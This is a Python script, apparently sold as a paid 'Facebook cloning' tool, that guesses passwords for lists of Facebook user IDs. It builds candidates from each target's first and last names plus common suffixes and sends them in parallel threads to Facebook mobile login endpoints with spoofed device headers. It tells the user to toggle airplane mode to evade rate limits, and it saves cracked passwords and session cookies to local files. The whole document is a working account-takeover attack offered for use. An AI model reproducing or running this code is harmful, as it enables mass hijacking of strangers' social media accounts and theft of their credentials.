fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

import os,base64,zlib,pip,sys, re, requests, time, random, json, string
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'zh_HK'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'TNT'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm} 

def clear():
	os.system('clear')
def back():
	login()
        
#YEAR CHECKER
def alex(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = '2009'
        elif ids[:9] in ['100000000']       :alif = '2009'
        elif ids[:8] in ['10000000']        :alif = '2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif ids[:6] in ['100001']          :alif = '2010-2011'
        elif ids[:6] in ['100002','100003'] :alif = '2011-2012'
        elif ids[:6] in ['100004']          :alif = '2012-2013'
        elif ids[:6] in ['100005','100006'] :alif = '2013-2014'
        elif ids[:6] in ['100007','100008'] :alif = '2014-2015'
        elif ids[:6] in ['100009']          :alif = '2015'
        elif ids[:5] in ['10001']           :alif = '2015-2016'
        elif ids[:5] in ['10002']           :alif = '2016-2017'
        elif ids[:5] in ['10003']           :alif = '2018-2019'
        elif ids[:5] in ['10004']           :alif = '2019-2020'
        elif ids[:5] in ['10005']           :alif = '2020'
        elif ids[:5] in ['10006','10007','']:alif = '2021'
        elif ids[:5] in ['10008']           :alif = '2022'
        elif ids[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = '2008-2009'
    elif len(ids)==8:
        alif = '2007-2008'
    elif len(ids)==7:
        alif = '2006-2007 '
    elif len(ids) in [13,14]:
        alif = '2023-2024'
    else:alif=''
    return alif

#YEAR CHECKER 2
def gray(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = '2009'
        elif uid[:9] in ['100000000']       :alif = '2009'
        elif uid[:8] in ['10000000']        :alif = '2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif uid[:6] in ['100001']          :alif = '2010-2011'
        elif uid[:6] in ['100002','100003'] :alif = '2011-2012'
        elif uid[:6] in ['100004']          :alif = '2012-2013'
        elif uid[:6] in ['100005','100006'] :alif = '2013-2014'
        elif uid[:6] in ['100007','100008'] :alif = '2014-2015'
        elif uid[:6] in ['100009']          :alif = '2015'
        elif uid[:5] in ['10001']           :alif = '2015-2016'
        elif uid[:5] in ['10002']           :alif = '2016-2017'
        elif uid[:5] in ['10003']           :alif = '2018-2019'
        elif uid[:5] in ['10004']           :alif = '2019-2020'
        elif uid[:5] in ['10005']           :alif = '2020'
        elif uid[:5] in ['10006','10007','']:alif = '2021'
        elif uid[:5] in ['10008']           :alif = '2022'
        elif uid[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' 2008-2009 '
    elif len(uid)==8:
        alif = ' 2007-2008 '
    elif len(uid)==7:
        alif = ' 2006-2007 '
    elif len(uid) in [13,14]:
        alif = ' 2023 '
    else:alif=''
    return alif

#import marshal,zlib,base64

        
logo="""\33[1;32m

                 █████╗ ██╗  ██╗██╗     
                ██╔══██╗╚██╗██╔╝██║     
                ███████║ ╚███╔╝ ██║     
                ██╔══██║ ██╔██╗ ██║     
                ██║  ██║██╔╝ ██╗███████╗
                ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
\33[1;32m ─────────────────────────────────────────────────────── 
  Owner      :  Alexander Grayson
  Facebook   :  AlexanderGraysonRecovery.IAmLimitless
  Tool Type  :  RPW Facebook Cloning Tool (Paid)
  Network    :  No Load Needed
  Version    :  1.1
\33[1;32m ───────────────────────────────────────────────────────"""
def linex():
	print(f'\033[1;32m ───────────────────────────────────────────────────────')
def clear():
        os.system('clear')
        print(logo)
user_opt=[]
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]


def menu():
    clear()
    print(' [1] File Cloning')
    linex()
    xd = input(' Choose an option: ')
    if xd in ['1', '01']:
        clear()
        print(' Put file example:  /sdcard/File.txt  ')
        linex()
        file = input(' Put file path:\033[1; \033[92;1m ')
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print(' File location not found ')
            time.sleep(1)
            menu()
        clear()
        print(' [1] Method 1')
        print(' [2] Method 2')
        print(' [3] Method 3')
        linex()
        mthd = input(' Choose: ')
        linex()
        plist = []
        print(' Select Password Crack Menu:')
        linex()
        print(' [1] Crack with Automatic Password \n [2] Crack with Password Choice \n [3] Working Passwords for Cloning ')
        linex()
        ppp = input('\033[1;32m Choose: ')
        if ppp in ['1', '01']:
            plist.append('first last')
            plist.append('firstlast')
            plist.append('first')
            plist.append('last')
            plist.append('first123')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first143')
            plist.append('last123')
            plist.append('last1234')
            plist.append('last12345')
            plist.append('last143')
            plist.append('lastfirst')
            plist.append('last first')
            plist.append('firstlast123')
            plist.append('lastfirst123')
            plist.append('firstlast143')
            plist.append('lastfirst143')
            plist.append('first last123')
            plist.append('last first123')
            plist.append('first last143')
            plist.append('last first143')
            plist.append('firstmaganda')
            plist.append('firstpogi')
            plist.append('lastmaganda')
            plist.append('lastpogi')
            plist.append('firstcute')
            plist.append('lastcute')
            plist.append('first2022')
            plist.append('first2023')
            plist.append('iloveyou')
            plist.append('i love you')
            plist.append('jesus123')
            plist.append('jesus143')
            plist.append('god123')
            plist.append('god143')
            
        elif ppp in ['3', '03']:
            clear()
            print(' \033[1;32mWorking password for Philippines\033[1;37m ')
            linex()
            print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first12345\n [5] first123\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
            
            linex()
            input(' Press enter to back menu ')
            menu()
        else:
            try:
                linex()
                ps_limit = int(input(' How many passwords do you want to add? '))
            except:
                ps_limit = 1
            linex()
            print('\033[1;32m example: first last,firtslast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f'\033[1;32m Put password {i+1}: '))
        #linex()
        ###print(' Do you want to show cookies? (y/n): ')
        #linex()
        ####c = input('\033[1;32m Choose: ')
        #######if (c).lower() == "y":
            ####user_opt.append("c")
        #$$#$$##with tred(max_workers=20) as Aking:
            linex()
            print(' Do you want to show cp accounts? (y/n): ')
        linex()
        cx = input('\033[1;32m Choose: ')
        if cx in ['y', 'Y', 'yes', 'Yes', '1']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=20) as crack_submit:
            clear()
            total_ids = str(len(fo))
            print(' [•] Total accounts : \033[1;32m' + total_ids + f' \033[1;33m---\033[1;33m> \033[1;37mMethod Number :\033[1;37m {mthd}')
            print("\033[1;37m \x1b[38;5; \033[92;1m[•] Use airplane mode every 200 counts.\033[1;37m")
            
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1', '01']:
                    crack_submit.submit(ffb1, ids, names, passlist)
                elif mthd in ['2', '02']:
                    crack_submit.submit(ffb00, ids, names, passlist)
                elif mthd in ['3', '03']:
                    crack_submit.submit(ffb22, ids, names, passlist)
                ######elif mthd in ['4', '04']:
                    #######crack_submit.submit(ffb4, ids, names, passlist)
                #######elif mthd in ['5', '05']:
                    ######crack_submit.submit(ffb5, ids, names, passlist)

        print('\033[1;37m')
        linex()
        print(' The process has completed')
        print(' Total OK/CP/2F: ' + str(len(oks)) + '/' + str(len(cps)) + '/' + str(len(twf)))
        linex()
        input(' Press enter to go back ')
        #####os.system('python alexcloning_allsim.py')
    #######elif xd in ['2','02']:
		    ####tokengetter()
    ########elif xd in ['3','03']:
		    ###file_making()

def ffb22(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
                        ua13 = random.choice(useragent1)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua13, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ALEX=session.cookies.get_dict().keys()
                        if "c_user" in ALEX:
                                coki=session.cookies.get_dict()
                                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ALEX-ALIVE] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                if ids[:4] in ['1000']:
                                	open(f'/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                elif ids[:4] in ['6155']:
                                	open(f'/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                open(f'/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')                                	
                                open(f'/sdcard/ALEX-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ALEX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open(f'/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass

def ffb00(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
                        ua12 = random.choice(useragent)

                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua12, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ALEX=session.cookies.get_dict().keys()
                        if "c_user" in ALEX:
                                coki=session.cookies.get_dict()
                                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ALEX-ALIVE] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                if ids[:4] in ['1000']:
                                	open(f'/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                elif ids[:4] in ['6155']:
                                	open(f'/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                open(f'/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')                                	
                                open(f'/sdcard/Alex-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ALEX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open(f'/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass

def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
                        ua11 = random.choice(useragent1)
                        
                        head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua11, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ALEX=session.cookies.get_dict().keys()
                        if "c_user" in ALEX:
                                coki=session.cookies.get_dict()
                                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ALEX-ALIVE] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                if ids[:4] in ['1000']:
                                	open(f'/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                elif ids[:4] in ['6155']:
                                	open(f'/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                open(f'/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')                                	
                                open(f'/sdcard/Alex-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+cookie+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ALEX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open(f'/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass

menu()                                